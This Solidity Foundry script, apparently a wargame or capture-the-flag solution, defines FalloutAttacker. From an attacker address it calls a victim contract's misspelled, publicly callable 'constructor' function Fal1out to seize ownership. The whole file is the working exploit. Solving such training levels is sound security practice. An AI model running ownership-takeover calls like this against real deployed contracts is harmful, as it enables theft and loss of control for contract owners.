// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IFallout {
    function Fal1out() external;
}

contract FalloutAttacker is Constants, Script {

    function run() public {
        IFallout victim = IFallout(FALLOUT_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }
    
    function attack(IFallout victim) private {
        victim.Fal1out();
    }
}